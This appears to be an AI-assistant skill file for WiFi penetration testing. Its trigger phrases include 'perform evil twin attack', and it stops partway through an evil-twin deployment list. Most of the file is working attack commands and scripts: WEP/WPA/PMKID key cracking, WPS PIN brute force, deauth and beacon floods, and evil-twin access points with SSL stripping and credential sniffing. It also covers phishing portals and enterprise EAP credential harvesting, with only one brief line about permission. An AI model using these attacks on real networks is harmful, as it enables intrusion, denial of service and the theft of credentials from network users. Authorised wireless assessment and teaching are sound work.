---
name: wireless-security-wifi-penetration-testing
description: Master wireless security and WiFi penetration testing with aircrack-ng, capturing handshakes, cracking WEP/WPA/WPA2/WPA3, and enterprise assessment
triggers:
  - how do I crack a WPA2 handshake
  - set my wifi adapter to monitor mode
  - capture wifi handshake with aircrack
  - perform evil twin attack on wireless network
  - crack WEP encryption with aircrack-ng
  - test enterprise wifi security with RADIUS
  - deauth wireless clients for handshake capture
  - analyze 802.11 traffic with wireshark
---

# Wireless Security & WiFi Penetration Testing

> Skill by [ara.so](https://ara.so) — Security Skills collection.

This skill provides comprehensive expertise in wireless security assessment and WiFi penetration testing using the aircrack-ng suite and related tools. It covers 802.11 protocol analysis, monitor mode configuration, WEP/WPA/WPA2/WPA3 attacks, rogue access points, enterprise wireless assessment, and professional reporting.

## What This Project Does

The Wireless Security & WiFi Penetration Testing curriculum teaches:

- **802.11 Protocol Fundamentals**: Frame types, encryption (WEP/WPA/WPA2/WPA3), authentication mechanisms
- **Wireless Reconnaissance**: SSID discovery, hidden network enumeration, traffic analysis
- **Attack Techniques**: WEP cracking, WPA/WPA2 handshake capture and cracking, PMKID attacks, WPS exploitation
- **Advanced Attacks**: Evil twin, rogue AP, wireless MITM, WPA-TKIP, WPA3 Dragonblood
- **Enterprise Assessment**: EAP/RADIUS testing, 802.1X exploitation
- **Defense**: Management frame protection (802.11w), WIDS, hardening recommendations

## Hardware Requirements

**Critical**: You need an injection-capable wireless adapter. Onboard laptop WiFi typically cannot enter monitor mode or inject packets.

### Recommended Chipsets
- **Atheros AR9271** (e.g., TP-Link TL-WN722N v1, Alfa AWUS036NHA)
- **Ralink RT3070/RT5372** (e.g., Alfa AWUS036NH)

### Verification
```bash
# List wireless interfaces
iwconfig

# Check if adapter supports monitor mode
iw list | grep -A 10 "Supported interface modes"

# Look for:
# * monitor
```

## Environment Setup

### Operating System
Use Kali Linux (bare-metal preferred for timing-sensitive attacks, VM acceptable with USB passthrough).

### Core Tools Installation
```bash
# Update package list
sudo apt update

# Install aircrack-ng suite (usually pre-installed on Kali)
sudo apt install -y aircrack-ng

# Install additional wireless tools
sudo apt install -y \
  hashcat \
  hcxtools \
  hcxdumptool \
  reaver \
  bully \
  kismet \
  wireshark \
  tcpdump \
  hostapd \
  dnsmasq \
  bettercap

# Optional: Evil twin/captive portal frameworks
sudo apt install -y wifiphisher
pip3 install wifipumpkin3
```

### Regulatory Domain Configuration
```bash
# Set regulatory domain (use your country code)
sudo iw reg set US

# Verify
iw reg get
```

**Warning**: Only transmit RF signals in compliance with local regulations and on networks you own or have written permission to test.

## Monitor Mode Configuration

### Enable Monitor Mode
```bash
# Method 1: Using airmon-ng (recommended)
# Stop interfering processes
sudo airmon-ng check kill

# Enable monitor mode on wlan0
sudo airmon-ng start wlan0

# Interface will be renamed to wlan0mon
iwconfig

# Method 2: Manual configuration
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
```

### Test Packet Injection
```bash
# Test injection capability (critical for attacks)
sudo aireplay-ng --test wlan0mon

# Successful output shows:
# Injection is working!
# Found X APs
```

### Disable Monitor Mode
```bash
# Using airmon-ng
sudo airmon-ng stop wlan0mon

# Restart NetworkManager
sudo systemctl restart NetworkManager

# Manual method
sudo ip link set wlan0mon down
sudo iw dev wlan0mon set type managed
sudo ip link set wlan0 up
```

## Wireless Reconnaissance

### Basic Network Discovery
```bash
# Discover all nearby access points
sudo airodump-ng wlan0mon

# Output columns:
# BSSID: MAC address of AP
# PWR: Signal strength
# Beacons: Broadcast frames
# #Data: Data packets
# CH: Channel
# ENC: Encryption type (WEP/WPA/WPA2)
# ESSID: Network name

# Target specific channel
sudo airodump-ng -c 6 wlan0mon

# Target specific BSSID and write to file
sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon
```

### Hidden SSID Discovery
```bash
# Monitor channel with hidden SSID
sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w hidden wlan0mon

# Deauth a client to force reconnect (reveals SSID)
# In another terminal:
sudo aireplay-ng --deauth 5 -a 00:11:22:33:44:55 wlan0mon
```

### Advanced Scanning with Kismet
```bash
# Start Kismet (web interface on http://localhost:2501)
sudo kismet

# Or headless mode
sudo kismet -c wlan0mon --override wardrive
```

## WEP Cracking

### Passive Capture Method
```bash
# Capture IVs (Initialization Vectors)
sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w wep wlan0mon

# Wait for 50,000+ IVs, then crack
aircrack-ng wep-01.cap

# Key will be displayed when cracked
```

### Active Injection Methods

#### ARP Request Replay Attack
```bash
# Terminal 1: Capture IVs
sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w wep-arp wlan0mon

# Terminal 2: Fake authentication (if needed)
sudo aireplay-ng --fakeauth 0 -a 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon

# Terminal 3: ARP replay attack
sudo aireplay-ng --arpreplay -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon

# Wait for ARP packets, then replay to generate IVs rapidly
# Crack when you have 20,000+ IVs
aircrack-ng wep-arp-01.cap
```

#### ChopChop Attack (No Clients Needed)
```bash
# Capture packets
sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w chopchop wlan0mon

# Run chopchop to decrypt a packet
sudo aireplay-ng --chopchop -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon

# Creates .xor file, use packetforge-ng to create ARP request
sudo packetforge-ng -0 -a 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF \
  -k 255.255.255.255 -l 255.255.255.255 -y replay_dec-*.xor -w arp-request

# Inject forged packet
sudo aireplay-ng --interactive -r arp-request wlan0mon

# Crack with generated IVs
aircrack-ng chopchop-01.cap
```

## WPA/WPA2 Cracking

### Handshake Capture
```bash
# Terminal 1: Start capture on target network
sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w wpa-handshake wlan0mon

# Terminal 2: Deauth a client to force handshake
# Wait until you see a connected client (STATION column)
sudo aireplay-ng --deauth 10 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon

# Look for "WPA handshake: 00:11:22:33:44:55" in airodump-ng output
# Stop capture with Ctrl+C
```

### Verify Handshake Capture
```bash
# Check if handshake was captured
aircrack-ng wpa-handshake-01.cap

# Should show:
# 1 handshake
# Or use tshark
tshark -r wpa-handshake-01.cap -Y "eapol" | grep -i "key"
```

### Dictionary Attack with aircrack-ng
```bash
# Crack with wordlist
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 00:11:22:33:44:55 wpa-handshake-01.cap

# Example output when successful:
# KEY FOUND! [ password123 ]
```

### GPU Acceleration with hashcat
```bash
# Convert capture to hashcat format
hcxpcapngtool -o hash.hc22000 wpa-handshake-01.cap

# Or for older hashcat versions
wlanhcx2ssid hash.hc22000

# Crack with hashcat (mode 22000 for WPA/WPA2)
hashcat -m 22000 -a 0 hash.hc22000 /usr/share/wordlists/rockyou.txt

# With GPU optimization
hashcat -m 22000 -a 0 -w 3 -O hash.hc22000 /usr/share/wordlists/rockyou.txt

# Show cracked passwords
hashcat -m 22000 hash.hc22000 --show
```

### PMKID Attack (No Client Required)
```bash
# Capture PMKID with hcxdumptool
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1

# Or target specific AP
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --filterlist=targets.txt --enable_status=15

# targets.txt contains BSSID:
# 001122334455

# Convert to hashcat format
hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng

# Crack PMKID
hashcat -m 22000 -a 0 pmkid.hc22000 /usr/share/wordlists/rockyou.txt
```

### Cowpatty with Rainbow Tables
```bash
# Generate rainbow table for ESSID
genpmk -f /usr/share/wordlists/rockyou.txt -d pmk-database -s "TargetSSID"

# Crack using precomputed PMKs
cowpatty -d pmk-database -r wpa-handshake-01.cap -s "TargetSSID"
```

## WPS Attacks

### WPS Detection
```bash
# Scan for WPS-enabled APs
sudo wash -i wlan0mon

# Output shows:
# BSSID, Channel, RSSI, WPS Version, WPS Locked, ESSID
```

### Reaver WPS PIN Attack
```bash
# Basic attack
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -vv

# Advanced options
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -vv -d 2 -T 0.5 -r 3:15

# Options:
# -c: Channel
# -d: Delay between PIN attempts
# -T: Timeout per PIN
# -r: Sleep after X failures for Y seconds
# -vv: Verbose output

# If AP has rate limiting
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -vv -L -N -d 15 -T 0.5 -r 3:60
```

### Bully Alternative
```bash
# Bully WPS attack
sudo bully wlan0mon -b 00:11:22:33:44:55 -c 6 -v 3

# With rate limiting protection
sudo bully wlan0mon -b 00:11:22:33:44:55 -c 6 -d -v 3
```

## Evil Twin & Rogue AP Attacks

### Basic Evil Twin with hostapd
```bash
# Create hostapd configuration
cat > evil-twin.conf << 'EOF'
interface=wlan0mon
driver=nl80211
ssid=FreeWiFi
hw_mode=g
channel=6
macaddr_acl=0
ignore_broadcast_ssid=0
EOF

# Start rogue AP
sudo hostapd evil-twin.conf

# In another terminal, configure DHCP
sudo dnsmasq -C /dev/null --dhcp-range=192.168.1.50,192.168.1.150 \
  --interface=wlan0mon --bind-interfaces --except-interface=lo
```

### Evil Twin with Internet Access (MITM)
```bash
# Configure hostapd
cat > evil-twin-mitm.conf << 'EOF'
interface=wlan0mon
driver=nl80211
ssid=CoffeeShop_Guest
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
EOF

# Start hostapd
sudo hostapd evil-twin-mitm.conf &

# Assign IP to interface
sudo ip addr add 192.168.100.1/24 dev wlan0mon
sudo ip link set wlan0mon up

# Configure DHCP
sudo dnsmasq -C dnsmasq-evil.conf

# dnsmasq-evil.conf:
# interface=wlan0mon
# dhcp-range=192.168.100.10,192.168.100.250,12h
# dhcp-option=3,192.168.100.1
# dhcp-option=6,8.8.8.8
# server=8.8.8.8

# Enable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# Configure NAT (assume eth0 is internet-connected)
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sudo iptables -A FORWARD -i wlan0mon -o eth0 -j ACCEPT
sudo iptables -A FORWARD -i eth0 -o wlan0mon -m state --state RELATED,ESTABLISHED -j ACCEPT

# Capture credentials with SSL stripping
sudo bettercap -iface wlan0mon
# In bettercap console:
# > set http.proxy.sslstrip true
# > set net.sniff.verbose true
# > http.proxy on
# > net.sniff on
```

### Automated Evil Twin with wifiphisher
```bash
# Target specific AP and clone it
sudo wifiphisher -aI wlan0mon -e "TargetSSID" -p firmware-upgrade

# Available phishing scenarios:
# -p firmware-upgrade: Fake firmware update page
# -p oauth-login: Fake OAuth login
# -p browser-plugin: Fake browser plugin update

# Custom deauth interface
sudo wifiphisher -aI wlan0mon -jI wlan1mon -e "TargetSSID"
```

### Captive Portal with WiFi Pumpkin 3
```bash
# Start WiFi Pumpkin 3
sudo wifipumpkin3

# In wp3 console:
wp3 > set interface wlan0mon
wp3 > set ssid "Free_Airport_WiFi"
wp3 > set proxy noproxy
wp3 > plugins
wp3 > use captiveflask
wp3 > set templates LoginPage
wp3 > start
```

## Deauthentication Attacks

### Broadcast Deauth (All Clients)
```bash
# Deauth all clients from AP
sudo aireplay-ng --deauth 0 -a 00:11:22:33:44:55 wlan0mon

# Send 10 deauth packets
sudo aireplay-ng --deauth 10 -a 00:11:22:33:44:55 wlan0mon
```

### Targeted Deauth (Specific Client)
```bash
# Deauth specific client
sudo aireplay-ng --deauth 0 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon

# Deauth for handshake capture (gentler)
sudo aireplay-ng --deauth 5 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon
```

### MDK4 Beacon Flood
```bash
# Install mdk4
sudo apt install mdk4

# Beacon flood attack (creates fake APs)
sudo mdk4 wlan0mon b -f ssid-list.txt -a -s 1000

# Deauth flood
sudo mdk4 wlan0mon d -c 6 -b blacklist.txt

# blacklist.txt contains target BSSIDs:
# 00:11:22:33:44:55
```

## Enterprise WPA (EAP/RADIUS) Assessment

### Reconnaissance of Enterprise Networks
```bash
# Capture EAP authentication attempts
sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w eap-capture wlan0mon

# Look for EAP frames in Wireshark
wireshark eap-capture-01.cap
# Filter: eapol or eap or radius
```

### Evil Twin for EAP Credential Harvesting
```bash
# Create fake enterprise AP with hostapd-wpe
sudo apt install hostapd-wpe

# Configure hostapd-wpe
cat > hostapd-wpe.conf << 'EOF'
interface=wlan0mon
driver=nl80211
ssid=CorporateWiFi
hw_mode=g
channel=6
ieee8021x=1
eapol_key_index_workaround=0
eap_server=1
eap_user_file=hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
private_key_passwd=
dh_file=/etc/hostapd-wpe/certs/dh
wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP
EOF

# Create eap_user file
cat > hostapd-wpe.eap_user << 'EOF'
* PEAP,TTLS,TLS,FAST
"t" TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC "password" [2]
EOF

# Start hostapd-wpe
sudo hostapd-wpe hostapd-wpe.conf

# Captured credentials and challenge/response in:
# /var/log/hostapd-wpe.log

# Crack MSCHAP challenges with hashcat
# Extract from log and format for hashcat mode 5500
hashcat -m 5500 -a 0 mschap.hash /usr/share/wordlists/rockyou.txt
```

### eaphammer for Advanced EAP Attacks
```bash
# Clone eaphammer
git clone https://github.com/s0lst1c3/eaphammer.git
cd eaphammer
./kali-setup

# Evil twin with automatic certificate generation
sudo ./eaphammer -i wlan0mon --channel 6 --auth wpa-eap --essid CorporateWiFi \
  --creds

# Targeted attack against known users
sudo ./eaphammer -i wlan0mon --channel 6 --auth wpa-eap --essid CorporateWiFi \
  --hostile-portal

# GTC downgrade attack
sudo ./eaphammer -i wlan0mon --essid CorporateWiFi --creds --negotiate gtc-downgrade
```

## Traffic Analysis

### Wireshark Filters for 802.11
```bash
# Capture traffic
sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w analysis wlan0mon

# Open in Wireshark
wireshark analysis-01.cap

# Useful filters:
# All EAPOL (handshake) frames:
eapol

# Beacon frames:
wlan.fc.type_subtype == 0x08

# Probe requests (client scanning):
wlan.fc.type_subtype == 0x04

# Deauthentication frames:
wlan.fc.type_subtype == 0x0c

# Data frames:
wlan.fc.type == 2

# Specific BSSID:
wlan.bssid == 00:11:22:33:44:55

# Management frames:
wlan.fc.type == 0

# Look for unencrypted data after WEP/WPA crack:
data && !wlan_mgt
```

### Decrypt WPA/WPA2 Traffic in Wireshark
```bash
# After cracking WPA key, decrypt traffic in Wireshark
# Edit → Preferences → Protocols → IEEE 802.11
# Enable decryption: ✓ Enable decryption
# Edit decryption keys → Add
# Key type: wpa-pwd
# Key: password:SSID
# Example: password123:MyNetwork

# Now data frames will be decrypted automatically
# Filter for HTTP traffic:
http
```

## WPA3 and Advanced Attacks

### Dragonblood WPA3 Downgrade
```bash
# Install dragonslayer toolkit
git clone https://github.com/vanhoefm/dragonslayer.git
cd dragonslayer

# Downgrade attack (force WPA3 to WPA2)
sudo ./dragonforce.py wlan0mon --target 00:11:22:33:44:55 --downgrade

# Then capture WPA2 handshake normally
```

### KRACK Attack Tools
```bash
# Clone krackattacks
git clone https://github.com/vanhoefm/krackattacks-scripts.git
cd krackattacks-scripts

# Test network vulnerability
sudo ./krack-test-client.py wlan0mon

# Disable hardware encryption (required for testing)
sudo ./disable-hwcrypto.sh wlan0

# Run attack
sudo ./krack-all-zero-tk.py wlan0mon
```

## Scripting and Automation

### Bash Script: Automated Handshake Capture
```bash
#!/bin/bash
# auto-handshake.sh - Automated WPA handshake capture

if [ "$EUID" -ne 0 ]; then
  echo "Run as root"
  exit 1
fi

INTERFACE="wlan0mon"
BSSID="$1"
CHANNEL="$2"
OUTPUT="handshake-$(date +%Y%m%d-%H%M%S)"

if [ -z "$BSSID" ] || [ -z "$CHANNEL" ]; then
  echo "Usage: $0 <BSSID> <CHANNEL>"
  exit 1
fi

echo "[*] Starting capture on $INTERFACE, targeting $BSSID on channel $CHANNEL"
airodump-ng -c "$CHANNEL" --bssid "$BSSID" -w "$OUTPUT" "$INTERFACE" &
AIRODUMP_PID=$!

sleep 10

echo "[*] Sending deauth packets..."
aireplay-ng --deauth 10 -a "$BSSID" "$INTERFACE"

sleep 5

kill $AIRODUMP_PID

if grep -q "WPA handshake" "${OUTPUT}-01.cap" 2>/dev/null; then
  echo "[+] Handshake captured! File: ${OUTPUT}-01.cap"
else
  echo "[-] No handshake captured. Try again."
fi
```

### Python Script: Parse airodump-ng CSV
```python
#!/usr/bin/env python3
# parse_airodump.py - Parse airodump-ng CSV output

import csv
import sys

if len(sys.argv) < 2:
    print(f"Usage: {sys.argv[0]} <airodump-csv-file>")
    sys.exit(1)

csv_file = sys.argv[1]

with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
    content = f.read()
    # airodump CSV has two sections split by blank line
    ap_section, client_section = content.split('\n\n', 1)

# Parse AP section
ap_reader = csv.DictReader(ap_section.splitlines())
print("=" * 80)
print("Access Points:")
print("=" * 80)

for row in ap_reader:
    bssid = row.get('BSSID', '').strip()
    pwr = row.get(' Power', '').strip()
    channel = row.get(' channel', '').strip()
    encryption = row.get(' Privacy', '').strip()
    essid = row.get(' ESSID', '').strip()
    
    if bssid and bssid != 'BSSID':  # Skip header
        print(f"BSSID: {bssid:20} PWR: {pwr:5} CH: {channel:3} ENC: {encryption:10} ESSID: {essid}")

# Parse client section
print("\n" + "=" * 80)
print("Clients:")
print("=" * 80)

client_reader = csv.DictReader(client_section.splitlines())
for row in client_reader:
    station = row.get('Station MAC', '').strip()
    bssid = row.get(' BSSID', '').strip()
    probes = row.get(' Probed ESSIDs', '').strip()
    
    if station and station != 'Station MAC':
        print(f"Client: {station:20} Connected to: {bssid:20} Probes: {probes}")
```

### Python Script: Automated PMKID Cracking
```python
#!/usr/bin/env python3
# pmkid_crack.py - Automated PMKID capture and crack

import subprocess
import time
import sys
import os

INTERFACE = "wlan0mon"
CAPTURE_TIME = 120  # seconds
WORDLIST = "/usr/share/wordlists/rockyou.txt"

def run_cmd(cmd):
    """Execute shell command"""
    print(f"[*] Running: {cmd}")
    subprocess.run(cmd, shell=True, check=True)

def capture_pmkid(output_file):
    """Capture PMKID with hcxdumptool"""
    print(f"[*] Capturing PMKID for {CAPTURE_TIME} seconds...")
    cmd = f"timeout {CAPTURE_TIME} hcxdumptool -i {INTERFACE} -o {output_file} --enable_status=15"
    
    try:
        subprocess.run(cmd, shell=True)
    except subprocess.CalledProcessError:
        pass  # timeout exits with non-zero

def convert_to_hashcat(pcapng_file, hash_file):
    """Convert pcapng to hashcat format"""
    print(f"[*] Converting {pcapng_file} to hashcat format...")
    cmd = f"hcxpcapngtool -o {hash_file} {pcapng_file}"
    run_cmd(cmd)

def crack_pmkid(hash_file):
    """Crack PMKID with hashcat"""
    print(f"[*] Cracking PMKID with hashcat...")
    cmd = f"hashcat -m 22000 -a 0 {hash_file} {WORDLIST} --quiet"
    
    try:
        subprocess.run(cmd, shell=True, check=True)
        
        # Show results
        print("\n[+] Attempting to display cracked passwords:")
        show_cmd = f"hashcat -m 22000 {hash_file} --show"
        subprocess.run(show_cmd, shell=True)
        
    except subprocess.CalledProcessError:
        print("[-] No passwords cracked.")

def main():
    if os.geteuid() != 0:
        print("[-] Must run as root")
        sys.exit(1)
    
    timestamp = time.strftime("%Y%m%d-%H%M%S")
    pcapng_file = f"pmkid-{timestamp}.pcapng"
    hash_file = f"pmkid-{timestamp}.hc22000"
    
    try:
        capture_pmkid(pcapng_file)
        
        if not os.path.exists(pcapng_file):
            print("[-] No capture file created")
            sys.exit(1)
        
        convert_to_hashcat(pcapng_file, hash_file)
        
        if not os.path.exists(hash_file):
            print("[-] No PMKID hashes extracted")
            sys.exit(1)
        
        crack_pmkid(hash_file)
        
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        sys.exit(1)

if __name__ == "__main__":
    main()
```

## Common Patterns

### Full WPA2 Attack Workflow
```bash
# 1. Enable monitor mode
sudo airmon-ng start wlan0

# 2. Discover targets
sudo airodump-ng wlan0mon

# 3. Focus on target and capture handshake
sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon

# 4. In another terminal, deauth client
sudo aireplay-ng --deauth 10 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon

# 5. Stop capture when handshake appears
# Ctrl+C in airodump-ng

# 6. Convert to hashcat format
hcxpcapngtool -o hash.hc22000 capture-01.cap

# 7. Crack with hashcat
hashcat -m 22000 -a 0 hash.hc22000 /usr/share/wordlists/rockyou.txt

# 8. Disable monitor mode
sudo airmon-ng stop wlan0mon
```

### Complete Evil Twin Deployment
```bash
# 1. Deauth legitimate AP clients
sudo aireplay-ng --deauth 0 -a 00:11:22:33:44:55 wlan0

# 2. Start evil twin (cloned SSID)
